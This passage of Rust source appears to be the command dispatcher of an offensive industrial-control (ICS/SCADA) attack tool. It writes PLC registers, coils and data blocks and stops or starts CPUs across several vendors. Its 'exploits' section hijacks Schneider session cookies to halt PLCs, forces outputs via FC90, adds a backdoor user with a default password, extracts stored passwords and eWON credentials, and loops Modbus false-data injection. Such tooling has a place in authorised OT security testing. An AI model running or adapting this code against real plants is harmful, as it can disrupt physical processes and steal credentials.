            let result = driver::enumerate_tags(ip, enip_port);
            pb.finish_and_clear();
            match result {
                Ok(tags) => {
                    for t in &tags {
                        println!(
                            "  [{:>5}] {} (type=0x{:04x}, dims={})",
                            t.instance_id, t.name, t.tag_type, t.dimensions
                        );
                    }
                    crate::display::print_success(&format!("{} tag(s) found.", tags.len()));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Beckhoff) => {
            use crate::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let devs =
                scan::discover_ip_with_port(ip, 3, true, port).unwrap_or_default();
            let Some(dev) = devs.into_iter().next() else {
                crate::display::print_error("No Beckhoff device found.");
                return Ok(());
            };
            let syms = scan::enumerate_symbols(&dev, &local_netid, port);
            if syms.is_empty() {
                crate::display::print_warn("No symbols found.");
            } else {
                for sym in &syms {
                    println!("  {}", sym.name);
                }
                crate::display::print_success(&format!("{} symbol(s).", syms.len()));
            }
        }
        Some(Protocol::Phoenix) => {
            use crate::vendors::phoenix::webvisit;
            let (project, tags) = webvisit::get_tags(ip, port)?;
            let values = webvisit::read_tag_values(ip, port, &tags)?;
            println!("  Project: {project}");
            for (name, val) in &values {
                println!("  {name}: {val}");
            }
            crate::display::print_success(&format!("{} tag(s).", tags.len()));
        }
        Some(p) => bail!("{p:?} does not support 'get tags'"),
        None => bail!("'--protocol <PROTO>' required for 'get tags'"),
    }
    Ok(())
}

fn get_tag(ip: &str, port: u16, _timeout: u64, name: &str, proto: Option<Protocol>) -> Result<()> {
    match proto {
        Some(Protocol::Rockwell) => {
            use crate::vendors::rockwell::driver;
            let enip_port = if port == 0 { 44818 } else { port };
            let pb = crate::display::spinner_start(&format!("Reading {name}…"));
            let result = driver::read_tag(ip, enip_port, name);
            pb.finish_and_clear();
            match result {
                Ok(raw) => println!("  {name} = 0x{}", hex_encode(&raw)),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Phoenix) => {
            use crate::vendors::phoenix::webvisit;
            let (_, tags) = webvisit::get_tags(ip, port)?;
            let values = webvisit::read_tag_values(ip, port, &tags)?;
            if let Some((_, val)) = values.iter().find(|(k, _)| k == name) {
                println!("  {name}: {val}");
            } else {
                crate::display::print_warn(&format!("Tag '{name}' not found."));
            }
        }
        Some(p) => bail!("{p:?} does not support 'get tag'"),
        None => bail!("'--protocol <PROTO>' required for 'get tag'"),
    }
    Ok(())
}

// ===================================================================
// Set
// ===================================================================

#[allow(clippy::too_many_lines)]
fn run_set(
    ip: &str,
    port: u16,
    timeout: u64,
    protocol: Option<Protocol>,
    noun: SetNoun,
) -> Result<()> {
    match noun {
        SetNoun::State { state } => set_state(ip, port, timeout, &state, protocol),
        SetNoun::Tag { assignment } => set_tag(ip, port, timeout, &assignment, protocol),
        SetNoun::Register { address, value } => {
            use crate::vendors::schneider::modbus;
            crate::display::print_info(&format!(
                "Writing register {address} = {value} on {ip}…"
            ));
            match modbus::write_single_register(ip, port, address, value) {
                Ok(()) => crate::display::print_success("Register written."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        SetNoun::Registers { start, values } => {
            use crate::vendors::schneider::modbus;
            let parsed: Vec<u16> = values
                .split(',')
                .filter_map(|s| s.trim().parse::<u16>().ok())
                .collect();
            if parsed.is_empty() {
                bail!("No valid register values in '{values}'");
            }
            match modbus::write_multiple_registers(ip, port, start, &parsed) {
                Ok(n) => crate::display::print_success(&format!("{n} register(s) written.")),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        SetNoun::Coil { address, state } => {
            use crate::vendors::schneider::modbus;
            let on = !state.eq_ignore_ascii_case("off");
            crate::display::print_info(&format!(
                "Writing coil {address} = {} on {ip}…",
                if on { "ON" } else { "OFF" }
            ));
            match modbus::write_single_coil(ip, port, address, on) {
                Ok(()) => crate::display::print_success("Coil written."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        SetNoun::Output { bits, password } => {
            use crate::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            crate::display::print_info(&format!("Writing outputs to {ip}…"));
            if s7comm::set_outputs(ip, &bits, s7_port, 5, password.as_deref()) {
                crate::display::print_success("Outputs written.");
            } else {
                crate::display::print_error("Failed to write outputs.");
            }
            Ok(())
        }
        SetNoun::Merkers {
            bits_offset,
            password,
        } => {
            use crate::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            let parts: Vec<&str> = bits_offset.splitn(2, ',').collect();
            let bits = parts[0];
            let offset: u32 = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
            crate::display::print_info(&format!("Writing merkers to {ip} (offset {offset})…"));
            if s7comm::set_merkers(ip, bits, offset, s7_port, 5, password.as_deref()) {
                crate::display::print_success("Merkers written.");
            } else {
                crate::display::print_error("Failed to write merkers.");
            }
            Ok(())
        }
        SetNoun::Dm { start, values } => {
            use crate::vendors::omron::fins;
            let fins_port = if port == 0 { 9600 } else { port };
            let parsed: Vec<u16> = values
                .split(',')
                .filter_map(|s| s.trim().parse::<u16>().ok())
                .collect();
            if parsed.is_empty() {
                bail!("No valid values in '{values}'");
            }
            match fins::write_dm_words(ip, fins_port, 0, start, &parsed) {
                Ok(()) => crate::display::print_success(&format!(
                    "{} DM word(s) written at DM{start}.",
                    parsed.len()
                )),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        SetNoun::Db {
            db,
            offset,
            data,
            password,
        } => {
            use crate::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            let bytes = parse_hex(&data);
            if bytes.is_empty() {
                bail!("Invalid hex data '{data}'");
            }
            crate::display::print_info(&format!(
                "Writing {} byte(s) to DB{db}:{offset} on {ip}…",
                bytes.len()
            ));
            match s7comm::write_data_block(ip, db, offset, &bytes, s7_port, 5, password.as_deref())
            {
                Ok(true) => crate::display::print_success("DB write acknowledged."),
                Ok(false) => crate::display::print_warn("Write sent: PLC did not acknowledge."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        SetNoun::D { start, values } => {
            use crate::vendors::mitsubishi::slmp;
            let slmp_port = if port == 0 { 5007 } else { port };
            let parsed: Vec<u16> = values
                .split(',')
                .filter_map(|s| s.trim().parse::<u16>().ok())
                .collect();
            if parsed.is_empty() {
                bail!("No valid D register values in '{values}'");
            }
            match slmp::write_word_devices(ip, slmp_port, "D", start, &parsed) {
                Ok(()) => crate::display::print_success(&format!(
                    "{} D register(s) written at D{start}.",
                    parsed.len()
                )),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        SetNoun::M { start, bits } => {
            use crate::vendors::mitsubishi::slmp;
            let slmp_port = if port == 0 { 5007 } else { port };
            let parsed: Vec<bool> = bits
                .trim()
                .chars()
                .filter_map(|c| match c {
                    '0' => Some(false),
                    '1' => Some(true),
                    _ => None,
                })
                .collect();
            if parsed.is_empty() {
                bail!("No valid bit values in '{bits}' (use 0/1 characters)");
            }
            match slmp::write_bit_devices(ip, slmp_port, "M", start, &parsed) {
                Ok(()) => crate::display::print_success(&format!(
                    "{} M bit(s) written at M{start}.",
                    parsed.len()
                )),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        SetNoun::Oid {
            oid,
            value,
            community,
            r#type,
            confirm,
        } => {
            use crate::vendors::snmp::client;
            if !confirm {
                bail!("Add --confirm to confirm you intend to write to {ip}");
            }
            let snmp_port = if port == 0 { 161 } else { port };
            let snmp_val = match r#type.as_str() {
                "int" => client::SnmpValue::Integer(value.parse::<i64>()?),
                _ => client::SnmpValue::OctetString(value.into_bytes()),
            };
            let result = client::set(ip, snmp_port, &community, &oid, &snmp_val)?;
            println!("  {oid} → {}", result.display());
            crate::display::print_success("SET accepted.");
            Ok(())
        }
        SetNoun::Sc { ioa, state } => {
            use crate::vendors::iec104::client;
            let iec_port = if port == 0 { 2404 } else { port };
            let on = !state.eq_ignore_ascii_case("off");
            let mut sess = client::connect(ip, iec_port)?;
            match client::single_command(&mut sess, ioa, on) {
                Ok(true) => crate::display::print_success(&format!(
                    "IOA {ioa}: Single Command {} confirmed.",
                    if on { "ON" } else { "OFF" }
                )),
                Ok(false) => {
                    crate::display::print_warn("Command sent: negative confirmation.");
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
        SetNoun::Dc { ioa, state } => {
            use crate::vendors::iec104::client;
            let iec_port = if port == 0 { 2404 } else { port };
            let state_name = match state {
                1 => "OFF",
                2 => "ON",
                _ => "INDETERMINATE",
            };
            crate::display::print_info(&format!(
                "IEC 104 Double Command IOA {ioa} → {state_name} on {ip}…"
            ));
            let mut sess = client::connect(ip, iec_port)?;
            match client::double_command(&mut sess, ioa, state) {
                Ok(true) => crate::display::print_success("Double Command confirmed."),
                Ok(false) => crate::display::print_warn("Command sent: negative confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
            Ok(())
        }
    }
}

fn set_state(
    ip: &str,
    port: u16,
    timeout: u64,
    state: &str,
    proto: Option<Protocol>,
) -> Result<()> {
    match proto {
        Some(Protocol::Siemens) => {
            use crate::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            if state.eq_ignore_ascii_case("flip") {
                if s7comm::change_cpu_state(ip, s7_port, 5) {
                    let new = s7comm::get_cpu_state(ip, s7_port, 5, None);
                    crate::display::print_success(&format!("New state: {new}"));
                } else {
                    crate::display::print_error("Failed to toggle CPU state.");
                }
            } else {
                let cur = s7comm::get_cpu_state(ip, s7_port, 5, None);
                let want_run = state.eq_ignore_ascii_case("run");
                let want_stop = state.eq_ignore_ascii_case("stop");
                if want_run && cur.eq_ignore_ascii_case("running") {
                    crate::display::print_info("Already running.");
                } else if want_stop && cur.eq_ignore_ascii_case("stopped") {
                    crate::display::print_info("Already stopped.");
                } else if want_run || want_stop {
                    crate::display::print_info(&format!("Current: {cur}"));
                    if s7comm::change_cpu_state(ip, s7_port, 5) {
                        let new = s7comm::get_cpu_state(ip, s7_port, 5, None);
                        crate::display::print_success(&format!("New state: {new}"));
                    } else {
                        crate::display::print_error("Failed to change CPU state.");
                    }
                } else {
                    crate::display::print_error(&format!(
                        "Unknown state '{state}': use run, stop, or flip."
                    ));
                }
            }
        }
        Some(Protocol::Omron) => {
            use crate::vendors::omron::fins;
            let fins_port = if port == 0 { 9600 } else { port };
            let run = !state.eq_ignore_ascii_case("stop");
            match fins::set_cpu_mode(ip, fins_port, 0, run) {
                Ok(true) => crate::display::print_success(&format!("CPU set to {state}.")),
                Ok(false) => crate::display::print_warn("FINS error: mode change rejected."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Beckhoff) => {
            use crate::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let devs =
                scan::discover_ip_with_port(ip, timeout, true, port).unwrap_or_default();
            let Some(dev) = devs.into_iter().next() else {
                crate::display::print_error("No Beckhoff device found.");
                return Ok(());
            };
            match scan::set_twincat_state(&dev, &local_netid, state, port) {
                Ok(_) => crate::display::print_success("State command sent."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Mitsubishi) => {
            use crate::core::network::NetworkInterface;
            use crate::vendors::mitsubishi::control;
            let iface = NetworkInterface {
                name: "auto".into(),
                ip: local_ip_for(ip),
                netmask: "255.255.255.0".into(),
            };
            match control::set_state_ip(&iface, ip, &state.to_lowercase()) {
                Ok(true) => crate::display::print_success("Command sent."),
                Ok(false) => crate::display::print_warn("Command sent (no confirmation)."),
                Err(e) => crate::display::print_error(&format!("Failed: {e}")),
            }
        }
        Some(Protocol::Phoenix) => {
            use crate::vendors::phoenix::control;
            let pb = crate::display::spinner_start(&format!("Sending {state} to {ip}…"));
            let action = if state.eq_ignore_ascii_case("stop") { "stop" } else { "start" };
            let start_type = match state.to_lowercase().as_str() {
                "warm" => "warm",
                "hot" => "hot",
                _ => "cold",
            };
            let result = control::control_ilc150(ip, port, action, start_type);
            pb.finish_and_clear();
            match result {
                Ok(s) => crate::display::print_success(&format!("State: {s}")),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(p) => bail!("{p:?} does not support 'set state'"),
        None => bail!("'--protocol <PROTO>' required for 'set state'"),
    }
    Ok(())
}

fn set_tag(
    ip: &str,
    port: u16,
    timeout: u64,
    assignment: &str,
    proto: Option<Protocol>,
) -> Result<()> {
    let Some((name, hex_val)) = assignment.split_once('=') else {
        bail!("Tag assignment must be NAME=HEXBYTES, e.g. MAIN.valve=01");
    };
    match proto {
        Some(Protocol::Rockwell) => {
            use crate::vendors::rockwell::driver;
            let enip_port = if port == 0 { 44818 } else { port };
            let value_bytes = parse_hex(hex_val);
            if value_bytes.is_empty() {
                bail!("Invalid hex value '{hex_val}'");
            }
            let type_code: u16 = if value_bytes.len() == 1 { 0x00C1 } else { 0x00C4 };
            match driver::write_tag(ip, enip_port, name, type_code, &value_bytes) {
                Ok(()) => crate::display::print_success(&format!("{name}: written")),
                Err(e) => crate::display::print_error(&format!("{name}: {e}")),
            }
        }
        Some(Protocol::Beckhoff) => {
            use crate::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let value_bytes = parse_hex(hex_val);
            if value_bytes.is_empty() {
                bail!("Invalid hex value '{hex_val}'");
            }
            let pb = crate::display::spinner_start(&format!("Discovering {ip}…"));
            let devs =
                scan::discover_ip_with_port(ip, timeout, true, port).unwrap_or_default();
            pb.finish_and_clear();
            let Some(dev) = devs.into_iter().next() else {
                crate::display::print_error("No Beckhoff device found.");
                return Ok(());
            };
            match scan::write_symbol_value(&dev, &local_netid, name, value_bytes, port) {
                Ok(true) => crate::display::print_success(&format!("Symbol '{name}' written.")),
                Ok(false) => crate::display::print_warn("Write sent: ADS error code returned."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Phoenix) => {
            use crate::vendors::phoenix::webvisit;
            webvisit::write_tag_value(ip, port, name, hex_val)?;
            crate::display::print_success(&format!("Wrote {name} = {hex_val}"));
        }
        Some(p) => bail!("{p:?} does not support 'set tag'"),
        None => bail!("'--protocol <PROTO>' required for 'set tag'"),
    }
    Ok(())
}

// ===================================================================
// Run (exploits)
// ===================================================================

#[allow(clippy::too_many_lines)]
fn run_run(ip: &str, port: u16, timeout: u64, cmd: RunCmd) -> Result<()> {
    match cmd {
        RunCmd::Reboot => {
            use crate::vendors::beckhoff::webcontrol;
            crate::display::print_info(&format!("Sending reboot to {ip}…"));
            match webcontrol::reboot(ip, port) {
                Ok(true) => crate::display::print_success("Reboot command sent."),
                Ok(false) => crate::display::print_warn("Reboot sent (no confirmation)."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::AddUser { credentials } => {
            use crate::vendors::beckhoff::webcontrol;
            let (username, password) = credentials
                .split_once(':')
                .unwrap_or((&credentials, "Sc4d4v3r!"));
            crate::display::print_info(&format!("Adding user '{username}' to {ip}…"));
            match webcontrol::add_user(ip, port, username, password) {
                Ok(true) => crate::display::print_success("User creation command sent."),
                Ok(false) => crate::display::print_warn("Command sent (no confirmation)."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::WriteSymbol { input } => {
            use crate::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let Some((sym_name, hex_val)) = input.split_once('=') else {
                bail!("Symbol assignment must be NAME=HEXBYTES, e.g. MAIN.valve=01");
            };
            let value_bytes = parse_hex(hex_val);
            if value_bytes.is_empty() {
                bail!("Invalid hex value (format: SymbolName=hexbytes)");
            }
            let pb = crate::display::spinner_start(&format!("Discovering {ip}…"));
            let devs =
                scan::discover_ip_with_port(ip, timeout, true, port).unwrap_or_default();
            pb.finish_and_clear();
            let Some(dev) = devs.into_iter().next() else {
                bail!("No Beckhoff device responded.");
            };
            match scan::write_symbol_value(&dev, &local_netid, sym_name, value_bytes, port) {
                Ok(true) => {
                    crate::display::print_success(&format!("Symbol '{sym_name}' written."));
                }
                Ok(false) => crate::display::print_warn("Write sent: ADS error code returned."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::FlashLed => {
            use crate::vendors::schneider::flash_led;
            crate::display::print_info(&format!("Sending Flash LED to {ip}…"));
            match flash_led::flash_led_ip(ip) {
                Ok(()) => crate::display::print_success("Flash LED command sent."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::SessionStop | RunCmd::SessionRun => {
            use crate::vendors::schneider::session_hijack;
            let action = if matches!(cmd, RunCmd::SessionStop) { "stop" } else { "run" };
            let pb = crate::display::spinner_start(&format!("Fetching session from {ip}…"));
            let session = session_hijack::get_session_cookie(ip, port);
            pb.finish_and_clear();
            let Some(session) = session else {
                bail!("Failed to get session cookie.");
            };
            crate::display::print_success(&format!(
                "Cookie: {} (booted {} times)",
                session.cookie_value, session.power_on_count
            ));
            let ok = session_hijack::control_plc(
                ip,
                port,
                &session.cookie_value,
                "Administrator",
                action,
            );
            if ok {
                crate::display::print_success(&format!("PLC {action} command sent."));
            } else {
                crate::display::print_error(&format!("Failed to {action} PLC."));
            }
        }
        RunCmd::Fc90Stop { model } => {
            use crate::vendors::schneider::modicon_fc90;
            crate::display::print_info(&format!("FC90 STOP ({model}) to {ip}…"));
            let result = if model.eq_ignore_ascii_case("tm221") {
                modicon_fc90::stop_tm221(ip, port)
            } else {
                modicon_fc90::stop_plc(ip, port)
            };
            match result {
                Ok(true) => crate::display::print_success("PLC stopped."),
                Ok(false) => crate::display::print_warn("Command sent: no confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::Fc90Start { model } => {
            use crate::vendors::schneider::modicon_fc90;
            crate::display::print_info(&format!("FC90 START ({model}) to {ip}…"));
            let result = if model.eq_ignore_ascii_case("tm221") {
                modicon_fc90::start_tm221(ip, port)
            } else {
                modicon_fc90::start_plc(ip, port)
            };
            match result {
                Ok(true) => crate::display::print_success("PLC started."),
                Ok(false) => crate::display::print_warn("Command sent: no confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::Fc90Force { output, state } => {
            use crate::vendors::schneider::modicon_fc90::{self, ForceState};
            let output_byte =
                u8::from_str_radix(output.trim().trim_start_matches("0x"), 16).unwrap_or(0x11);
            let force_state = match state.to_lowercase().as_str() {
                "off" => ForceState::Off,
                "unforce" => ForceState::Unforce,
                _ => ForceState::On,
            };
            crate::display::print_info(&format!(
                "FC90 Force output 0x{output_byte:02x} to {state} on {ip}…"
            ));
            match modicon_fc90::force_output_bit(ip, port, output_byte, force_state) {
                Ok(true) => crate::display::print_success("Force command sent."),
                Ok(false) => crate::display::print_warn("Command sent: no confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::Passwords => {
            use crate::vendors::phoenix::webvisit;
            let pb =
                crate::display::spinner_start(&format!("Retrieving passwords from {ip}…"));
            let result = webvisit::retrieve_passwords(ip, port);
            pb.finish_and_clear();
            match result {
                Ok(entries) if entries.is_empty() => {
                    crate::display::print_warn("No passwords retrieved.");
                }
                Ok(entries) => {
                    for e in &entries {
                        if let Some(p) = &e.password {
                            println!("  User Level {}: {p}", e.user_level);
                        } else if let Some(h) = &e.hash {
                            println!("  User Level {} [sha256]: {h}", e.user_level);
                        }
                    }
                    crate::display::print_success(&format!(
                        "{} password entry/entries found.",
                        entries.len()
                    ));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::EwonCreds { max_users } => {
            use crate::vendors::ewon::exploit;
            crate::display::print_info(&format!("Extracting credentials from {ip}…"));
            let users = exploit::exploit(ip, port, "adm", max_users);
            if users.is_empty() {
                crate::display::print_warn("No credentials extracted.");
            } else {
                crate::display::print_success(&format!(
                    "Extracted {} credential(s).",
                    users.len()
                ));
            }
        }
        RunCmd::Portscan { ports } => {
            use crate::core::portscan::scan_ot_ports;
            use colored::Colorize;
            let extra: Vec<u16> = ports
                .as_deref()
                .unwrap_or("")
                .split(',')
                .filter_map(|s| s.trim().parse::<u16>().ok())
                .collect();
            crate::display::print_info(&format!("Scanning OT ports on {ip}…"));
            let results = scan_ot_ports(ip, timeout, &extra);
            println!("\n  {:<6} {:<16} Banner", "Port", "Service");
            println!("  {}", "─".repeat(60));
            for r in &results {
                if r.open {
                    let banner = r.banner.as_deref().unwrap_or("");
                    println!(
                        "  {:<6} {:<16} {}",
                        r.port.to_string().green(),
                        r.service.green(),
                        banner
                    );
                }
            }
            let open = results.iter().filter(|r| r.open).count();
            println!();
            if open == 0 {
                crate::display::print_warn("No open ports found.");
            } else {
                crate::display::print_success(&format!("{open} open port(s) found."));
            }
        }
        RunCmd::Shellshock { http_port } => {
            use crate::core::shellshock::test_shellshock;
            use colored::Colorize;
            crate::display::print_info(&format!(
                "Testing Shellshock (CVE-2014-6271) on {ip}:{http_port}…"
            ));
            let results = test_shellshock(ip, http_port, timeout);
            println!("\n  {:<36} {:<12} Evidence", "Path", "Status");
            println!("  {}", "─".repeat(72));
            let mut any_vuln = false;
            for r in &results {
                let status = if r.vulnerable {
                    any_vuln = true;
                    "VULNERABLE".red().bold()
                } else {
                    "safe".dimmed()
                };
                println!("  {:<36} {:<12} {}", r.path, status, r.evidence);
            }
            println!();
            if any_vuln {
                crate::display::print_warn("Target may be vulnerable to Shellshock.");
            } else {
                crate::display::print_success("No Shellshock vulnerability detected.");
            }
        }
        RunCmd::DefaultCreds { path, http_port } => {
            use crate::core::httpcreds::test_http_basic;
            crate::display::print_info(&format!(
                "Testing HTTP default credentials on {ip}:{http_port}{path}…"
            ));
            match test_http_basic(ip, http_port, &path, timeout) {
                Some(r) => {
                    crate::display::print_success(&format!(
                        "Valid credentials: {}:{} (HTTP {})",
                        r.username, r.password, r.status
                    ));
                }
                None => crate::display::print_warn("No default credentials accepted."),
            }
        }
        RunCmd::Fdi { address, value, target, interval, count } => {
            use crate::core::modbus_fdi::{fdi_loop, FdiTarget};
            let fdi_target = match target.to_lowercase().as_str() {
                "coil" => FdiTarget::Coil,
                _ => FdiTarget::Register,
            };
            let desc = match fdi_target {
                FdiTarget::Coil => format!("Coil[{address}] = {}", if value != 0 { "ON" } else { "OFF" }),
                FdiTarget::Register => format!("HR[{address}] = {value}"),
            };
            crate::display::print_info(&format!(
                "FDI: injecting {desc} on {ip} every {interval}s{}…",
                if count > 0 { format!(" ({count} writes)") } else { " (Ctrl-C to stop)".into() }
            ));
            if let Err(e) = fdi_loop(ip, port, address, value, fdi_target, interval, count) {
                crate::display::print_error(&format!("{e}"));
            }
        }
        // ModbusServer is handled before run_run() in the Verb::Run dispatch.
        RunCmd::ModbusServer { .. } => unreachable!(),
    }
    Ok(())
}

// ===================================================================
// DB
// ===================================================================

fn run_db(cmd: DbCmd) -> Result<()> {
    use crate::db::Database;
    let db = Database::open(&Database::default_path())?;
    match cmd {
        DbCmd::Add { ip, vendor } => {
            let vendor = vendor.as_deref().unwrap_or("unknown");
            let id = db.upsert_device(
                &ip,
                vendor,
                &serde_json::Value::Object(serde_json::Map::default()),
            )?;
            crate::display::print_success(&format!("Added {ip} (vendor={vendor}, id={id})"));
        }
        DbCmd::Remove { id } => {
            db.delete_device(id)?;
            crate::display::print_success(&format!("Removed device id={id}"));
        }
        DbCmd::Refs { vendor } => {
            use scadaver::references;
            let entries: Vec<&references::Reference> = match vendor.as_deref() {
                Some(v) => references::for_vendor(v),
                None => references::all().iter().collect(),
            };
            if entries.is_empty() {
                println!("No references found.");
                println!("Valid slugs: beckhoff siemens schneider rockwell mitsubishi omron");
                println!("            phoenix ewon modbus iec104 enip snmp malware ics-general general");
            }
            for r in entries {
                println!("[{}]  {}\n  {}\n", r.source, r.title, r.url);
            }
        }
    }
    Ok(())
}

// ===================================================================
// Helpers
// ===================================================================

fn local_ip_for(target: &str) -> String {
    use std::net::UdpSocket;
    let Ok(sock) = UdpSocket::bind("0.0.0.0:0") else {
        return "0.0.0.0".into();
    };
    let _ = sock.connect(format!("{target}:1"));
    sock.local_addr()
        .map_or_else(|_| "0.0.0.0".into(), |a| a.ip().to_string())
}

fn summarize_device(info: &crate::core::autodetect::DeviceInfo) -> String {
    const FIELDS: &[(&str, &str)] = &[
        ("hardware", "Hardware"),
        ("firmware", "FW"),
        ("cpu_state", "CPU"),
        ("product_name", "Product"),
        ("revision", "Rev"),
        ("plc_type", "Type"),
        ("model", "Model"),
        ("version", "Version"),
        ("name", "Name"),
        ("tc_version", "TwinCAT"),
        ("netid", "NetID"),
        ("serial", "Serial"),
        ("snmp_community", "community"),
        ("sys_descr", "sysDescr"),
        ("sys_name", "sysName"),
    ];
    let mut parts = Vec::new();
    for (key, label) in FIELDS {
        let Some(value) = info.fields.get(*key) else {
            continue;
        };
        let text = match value {
            serde_json::Value::String(s) => s.clone(),
            other => other.to_string(),
        };
        if !text.is_empty() {
            parts.push(format!("{label}={text}"));
        }
    }
    if parts.is_empty() {
        info.vendor.to_uppercase()
    } else {
        format!("{}  {}", info.vendor.to_uppercase(), parts.join("  "))
    }
}

fn hex_encode(b: &[u8]) -> String {
    use std::fmt::Write;
    b.iter().fold(String::new(), |mut s, x| {
        let _ = write!(s, "{x:02x}");
        s
    })
}

fn parse_hex(s: &str) -> Vec<u8> {
    let s = s.trim().trim_start_matches("0x");
    s.as_bytes()
        .chunks(2)
        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
        .collect()
}
